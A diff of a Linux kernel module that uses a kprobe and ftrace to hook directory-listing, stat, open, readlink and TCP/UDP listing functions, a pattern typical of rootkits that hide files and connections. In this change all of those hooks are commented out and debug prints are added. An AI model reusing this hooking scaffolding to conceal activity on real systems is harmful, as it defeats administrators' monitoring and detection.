@@ -37,19 +37,20 @@ static struct ftrace_hook EX_hooks[] = {
 	// compat_fillonedir
 	// compat_filldir 
 
-	HOOK("filldir64", ex_filldir64, &real_filldir64),
-	HOOK("filldir", ex_filldir, &real_filldir),
+// 	HOOK("filldir64", ex_filldir64, &real_filldir64),
+// 	HOOK("filldir", ex_filldir, &real_filldir),
 
-	HOOK("vfs_statx", ex_vfs_statx, &real_vfs_statx),
+// 	HOOK("vfs_statx", ex_vfs_statx, &real_vfs_statx),
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
-	HOOK("do_sys_openat2", ex_do_sys_openat2, &real_do_sys_openat2),
-#else
-	HOOK("do_sys_open", ex_do_sys_open, &real_do_sys_open),
-#endif
+// #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
+// 	HOOK("do_sys_openat2", ex_do_sys_openat2, &real_do_sys_openat2),
+// #else
+// 	HOOK("do_sys_open", ex_do_sys_open, &real_do_sys_open),
+// #endif
 	
-	HOOK("do_readlinkat", ex_do_readlinkat, &real_do_readlinkat),
+// 	HOOK("do_readlinkat", ex_do_readlinkat, &real_do_readlinkat),
 
+// не стоят
 	// ??
 	// sys_link sys_unlink sys_rename
 	//  sys_mkdir sys_rmdir  sys_access 
@@ -58,13 +59,15 @@ static struct ftrace_hook EX_hooks[] = {
 	// HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
 	// HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
 	// HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),
-	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
-	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
-	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
-	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
+// конец не стоят
+
+	// HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
+	// HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
+	// HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
+	// HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
 };
 
-static unsigned long (*real_kallsyms_lookup_name)(const char *name);
+static unsigned long (*real_kallsyms_lookup_name)(const char *name) = NULL;
 
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name",
@@ -154,7 +157,7 @@ static int fh_install_hook(struct ftrace_hook *hook)
 	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
 	                | FTRACE_OPS_FL_RECURSION
 	                | FTRACE_OPS_FL_IPMODIFY;
-
+	
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
 	if (err) {
 		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
@@ -180,12 +183,12 @@ static void fh_remove_hook(struct ftrace_hook *hook)
 
 	err = unregister_ftrace_function(&hook->ops);
 	if (err) {
-		pr_debug("unregister_ftrace_function() failed: %d\n", err);
+		pr_err("unregister_ftrace_function() failed: %d\n", err);
 	}
 
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
 	if (err) {
-		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
+		pr_err("ftrace_set_filter_ip() failed: %d\n", err);
 	}
 }
 
@@ -200,7 +203,7 @@ static int get_addr(void) {
 
 	real_block_class = (struct class *)real_kallsyms_lookup_name("block_class");
 	if (!real_block_class) {
-		pr_err("Failed to resolve real_getname\n");
+		pr_err("Failed to resolve block_class\n");
 		return -ENOENT;
 	}
 	pr_info("Get addr block_class\n");
@@ -234,21 +237,21 @@ int fh_install_hooks(void)
 {
     int err;
 	size_t i;
-
+	pr_info("1\n");
     if (!get_kallsyms_lookup_name()) {
         return -1;
     }
-
+	pr_info("2\n");
 	for (i = 0; i < ARRAY_SIZE(EX_hooks); i++) {
 		err = fh_install_hook(&EX_hooks[i]);
 		if (err)
 			goto error;
 	}
-
+	pr_info("3\n");
 	if (get_addr()) {
 		goto error;
 	}
-
+	pr_info("4\n");
 	return 0;
 
 error:
